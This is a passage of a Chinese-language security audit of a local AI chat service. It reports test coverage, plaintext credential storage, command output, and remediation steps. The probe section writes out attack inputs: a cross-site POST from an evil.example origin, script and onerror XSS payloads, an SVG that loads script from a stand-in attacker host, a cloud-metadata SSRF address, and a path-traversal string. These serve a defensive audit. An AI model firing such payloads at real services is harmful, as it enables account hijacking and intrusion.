node --test test/ai-service.test.mjs
  → 8 pass / 0 fail / 0 skipped（duration 1015ms）

node --test test/ai-ui-browser.test.mjs
  → 4 skipped / 0 pass / 0 fail
```

skip 原因：

```js
// test/ai-ui-browser.test.mjs:13
const playwright = createRequire(import.meta.url)(process.env.DAGUAN_PLAYWRIGHT_MODULE || 'playwright');
// :23
const skip = !playwright && 'Install Playwright or set DAGUAN_PLAYWRIGHT_MODULE';
```

本环境 `node_modules/playwright`、`playwright-core`、`@playwright` 均不存在（`Test-Path` 全 False），因此 4 个 UI 用例全部跳过——**AI 面板的端到端回归覆盖实际为 0**。

`test/ai-service.test.mjs` 的质量是可信的（真实本地 http 假上游 + `mkdtemp` 临时目录，不是只断言 mock）：

- `:9-13` validateBaseUrl 策略（拒内嵌凭据、拒公网 http、放行 loopback）
- `:15-25` 只返回掩码 Key（`assert.equal(profile.key, undefined)`）、diagram 降级 SVG 且断言不含 `script`/`foreignObject`/`onload`
- `:30-56` `aiFixture` 假上游提供 `/v1/models` 与 SSE/JSON 两种响应，`reasoning_content:'PRIVATE'` 用于验证思考内容不外泄
- `:59-69` `createAnswerFilter` 逐字符分块、嵌套 `<think><thinking>`、未闭合、`a < b`、`$x<2$<think>`
- `:71-81` 默认 streaming、models 列表、无模型时 reject、Key 留空沿用
- `:83-97` 流式/非流式开关、**断言整段 SSE 不含 `PRIVATE|think`**
- `:99-110` 旧历史只在读取与回送时过滤，原文件保留 `<think>PRIVATE</think>`
- `:112-118` 非流式兼容误返 SSE 的上游
- `:120-134` 上游 401 与 `service.stop()` 均不写历史

**覆盖缺口**（无对应用例）：90s 超时行为、并发闸（`runs.size >= 2`）、`safeText` 截断、DNS 失败/重绑定分支、`169.254.169.254` 拒绝、跨站 Origin 校验、"Key 不外发/不进日志"、前端 XSS 清洗、`ai-history` 明文含答案。

**修复建议**

- 在 CI 或打包流程中安装 Playwright（或提供 `DAGUAN_PLAYWRIGHT_MODULE` 路径），让 4 个 UI 用例真正运行；否则至少给它们加"必须显式跳过"的环境变量门槛，避免静默 0 覆盖。
- 按上表补齐服务端用例。

**验证方式**

重跑两个测试文件并记录 pass/skip 数（见第 3 节）。

---

## 2) 凭据存储与暴露面小结

| 项目 | 结论 | 证据 |
| --- | --- | --- |
| AI Key 存储位置 | `<数据目录>/ai-profiles.json`，字段 `key` 明文 | `local-server/store.mjs:12`；实测文件含 `"key": "sk-csrf-probe-key"` |
| 官网 token 存储位置 | `<数据目录>/cxyonly-integration.json`，字段 `token` 明文 | `local-server/store.mjs:10`、`local-server/cxyonly-client.mjs:114-124` |
| 文件权限 | Windows 上 `mode:0o600` 与 `chmod 0o700` 全部被跳过，依赖目录继承 ACL | `local-server/store.mjs:19-21`、`:28-34`；`Get-Acl` 实测含 `Modify`/`FullControl` 组 |
| 是否进日志 | 否。三个模块中 `console.*` 命中：ai-service 0、cxyonly-client 0、server 仅两条启动日志 | `Select-String -Pattern 'console\.'` |
| 是否回传前端 | 否。只回 `keyHint`（`sk-••••key`），实测响应无 `key` 字段 | `local-server/ai-service.mjs:124-137`；实测 `GET /api/ai/profiles` |
| 渲染进程能否拿到 | 不能直接拿。`preload.cjs` 只暴露 `getStartup/setStartup/getAppVersion/remoteAccess`；但 AI-01 的 XSS 可在受信 origin 内调用白名单 IPC | `desktop/preload.cjs:108-113`、`desktop/electron-main.cjs:162/332-342/354-368` |
| 错误信息泄露 | `redactSecrets()` 覆盖 token/password/secret/authorization/cookie；但上游原始错误文案会透给前端 | `local-server/cxyonly-client.mjs:13-19`；`local-server/ai-service.mjs:403-404` |
| 遥测/备份外发 | 未发现遥测代码；但数据目录位于 `%LOCALAPPDATA%`，明文凭据可能被第三方备份/同步工具带走 | 代码检索无上报路径 |
| 导出接口 | `/export` 只回文档，不含 token | `local-server/server.mjs:583-591` |

**结论**：凭据**没有**通过 API、日志或遥测外泄；主要问题是**静态存储明文 + Windows 权限位失效**，以及 AI-02 允许任意网页改写 baseUrl 从而间接劫持后续数据流（不是直接读 Key）。

---

## 3) 已跑命令与输出摘录

### 3.1 测试

```
$ node --test test/ai-service.test.mjs
# pass 8 / fail 0 / skipped 0，duration_ms 1015

$ node --test test/ai-ui-browser.test.mjs
# pass 0 / fail 0 / skipped 4
# 原因：node_modules/playwright、playwright-core、@playwright 均不存在
```

### 3.2 起服务（临时数据目录，端口 18086）

```
$ $env:DAGUAN_DATA_DIR="$env:TEMP\dg-audit-08"; $env:PORT=18086; node local-server/server.mjs
SERVICE_INSTANCE_READY http://127.0.0.1:18086/ 95a88413-4aa3-49de-9c63-77cae6f1054f

$ Get-NetTCPConnection -LocalPort 18086 | Select LocalAddress
LocalAddress
------------
127.0.0.1
```

### 3.3 HTTP 探针（`Invoke-WebRequest`，节选）

```
GET  /api/ai/profiles                    -> 200 {"ok":true,"profiles":[]}

POST /api/ai/profiles
  Content-Type: text/plain; Origin: https://evil.example
  {"name":"csrf-probe","baseUrl":"http://127.0.0.1:9/v1","model":"m1","key":"sk-csrf-probe-key"}
  -> 200 {"ok":true,"profile":{"id":"7e2be830-...","baseUrl":"http://127.0.0.1:9/v1",
          "active":true,"keyHint":"sk-••••key",...}}          ← 跨站写入成功

GET  /api/ai/profiles                    -> 200，只含 keyHint，无 key 字段

POST /api/ai/chat   body "{not json"     -> 500 {"ok":false,"code":null,"error":"JSON 格式错误"}
POST /api/ai/chat   不存在 profileId      -> 500 {"ok":false,"code":null,"error":"AI 服务档案不存在"}
GET  /api/ai/profiles/nope/models        -> 500 {"ok":false,"code":null,"error":"AI 服务档案不存在"}
POST /api/ai/chat   不可达上游            -> 200 SSE: {"type":"started","runId":"6ad14832-..."}
                                                  {"type":"error","runId":"...","error":"fetch failed"}
POST /api/ai/chat   畸形 question（字符串）-> 200 SSE，同样 "fetch failed"
OPTIONS /api/ai/profiles                 -> 404 {"error":"资源不存在"}（无 CORS 头）
POST /api/ai/chat   11MB body            -> 500 {"ok":false,"code":null,"error":"请求体过大"}
GET  /api/ai/conversations/a%2F..%2F..%2Fb/q1 -> 200 {"ok":true,"version":1,"messages":[],...}
                                          （路径穿越未成功：profileKey() 清洗非法字符）
```

### 3.4 落盘与 ACL

```
$ Get-Content "$env:TEMP\dg-audit-08\ai-profiles.json"
{ "version": 1, "profiles": [ { ..., "key": "sk-csrf-probe-key", ... } ] }     ← 明文

$ (Get-Acl "$env:TEMP\dg-audit-08").Access
LAPTOP-4HH5HER9\CodexSandboxUsers  Modify
LAPTOP-4HH5HER9\14666              FullControl
NT AUTHORITY\SYSTEM                FullControl
BUILTIN\Administrators             FullControl
```

### 3.5 行为探针（自建脚本，均在 `%TEMP%\dg-audit-08` 下）

```
# marked（xss-probe.cjs）
<img src=x onerror="alert(1)">        -> 原样输出
<script>alert(1)</script>             -> 原样输出
[click](javascript:alert(1))          -> <p><a href="javascript:alert(1)">click</a></p>

# validateBaseUrl（ssrf-probe.mjs）
ALLOW  http://169.254.169.254/latest/meta-data/ -> http://169.254.169.254/latest/meta-data
ALLOW  http://127.0.0.1:18086/                  -> http://127.0.0.1:18086
REJECT http://example.com/v1                    -> 公网 AI 接口必须使用 HTTPS；...
REJECT http://user:pw@example.com/v1            -> API 地址不能内嵌账号或密码

# cxyonly-client 超时/重试（cxy-probe.mjs）
A) STILL PENDING after 12s (elapsed 12015ms, server hits=1)
B) threw: /api/questions/q1/state: boom status=500 (hits=6, elapsed 1856ms)
C) threw: ... status=401 code=AUTH_EXPIRED (hits=2)
D) ok (hits=2)

# 上下文增长（ctx-probe / ctx-probe2）
turn 1: messages=2 totalChars=135445 / turn 2: messages=4 totalChars=270526
turn 1: messages=2 totalChars=100453 / turn 2: messages=4 totalChars=200544
ai-history bytes=601019 messages=4
contains full stem? true | contains 标准答案? true | contains 官方解析? true

# SVG 清洗（svg-probe.mjs）
SURVIVES | <svg><rect/onload="alert(1)"/></svg>
SURVIVES | <svg><script src="//evil.example/x.js"/></svg>
SURVIVES | <svg><animate attributeName="href" values="javascript:alert(1)"/></svg>
```

---

## 4) 未能验证事项

| 事项 | 未验证理由 |
| --- | --- |
| 真实第三方 AI 端点上的端到端表现（真实 401/429/超长回答） | 硬约束禁止付费/写入调用；仅用本地假上游模拟 |
| 真实 `www.cxyonly.fans` 的接口契约与版本兼容 | 未做真实登录，未读取真实 `cxyonly-integration.json`；契约结论来自 `local-server/cxyonly-client.mjs` 代码 |
| 169.254.169.254 的实际响应内容（SSRF 实害） | 只做了只读策略验证（`validateBaseUrl` 返回值），未发起真实元数据请求 |
| DOM 级 XSS 端到端复现（真实浏览器执行 `onerror`） | 环境无 `jsdom`/`happy-dom`（`node_modules` 内均不存在），Playwright 亦未安装；仅做到"marked 输出原样保留 onerror"与"渲染点用 innerHTML"的链路证明 |
| 桌面版 CSP 是否真的拦截内联事件处理器 | 需要真实 Electron 运行环境；结论基于 `desktop/policy.mjs:5-18` 中 `script-src 'unsafe-inline'` 的语义推断 |
| 浏览器版在真实浏览器中的 CSRF 可行性 | 用 `Invoke-WebRequest` 模拟了"简单请求 + 外部 Origin"，未在真实浏览器里跨站发起 |
| `ai-ui-browser.test.mjs` 4 个用例的实际行为 | Playwright 未安装，全部 skip |
| 数据目录被备份/同步工具带走的实际概率 | 未检查用户机器上的备份软件配置 |

---

## 5) 优化建议（按性价比排序）

1. **补上新界面的 AI 输出清洗**（AI-01）。把 `sanitizeAiHtml` 抽成共享模块，在 `renderMarkdown` 返回前套用；顺手去掉 CSP 里的 `'unsafe-inline'`。改动小、收益最大，直接消掉 P0。
2. **给 `/api/ai/*` 加来源校验**（AI-02）。最省事的做法是启动时生成随机 `X-Daguan-Token` 注入页面、所有写接口校验该头（简单请求无法自定义头，天然挡 CSRF），同时强制 `Content-Type: application/json`。一条中间件即可覆盖全部写接口。
3. **收紧密网策略并给 `cxyonly-client` 加超时**（AI-03 + AI-05）。排除 `169.254.0.0/16` 等地址段；给所有 `fetch` 加 `AbortSignal.timeout`，`fetchStates` 加总预算。这两项都是低风险改动，能同时消掉 SSRF 与"同步卡死"。
4. **把 90s 总超时改成空闲超时，并持久化被中断的部分答案**（AI-06）。用户体验提升明显，且避免"答案看过就没了"。
5. **上下文按题去重 + token 预算**（AI-07）。历史只留对话，题干上下文只注入一次；加字符预算与截断策略。省钱最直接。
6. **凭据加密与权限收紧**（AI-04）。优先用 Electron `safeStorage`；Windows 上显式设置 DACL 而非依赖 `mode`。
7. **错误语义与文案分类**（AI-09 + AI-10）。4xx/429 归位，上游错误归一成枚举并给中文可行动提示。
8. **首次使用告知 + "不发送答案与解析"开关**（AI-08）。合规与信任成本最低的一步。
9. **补齐测试**（AI-14）。先让 Playwright 用例真正跑起来（或显式声明跳过原因），再补超时/并发/SSRF/清洗用例。
10. **修 `sanitizeSvgMarkup` 与图片体积上限**（AI-11 + AI-13）。属于纵深防御与体验打磨，可以排在后面。
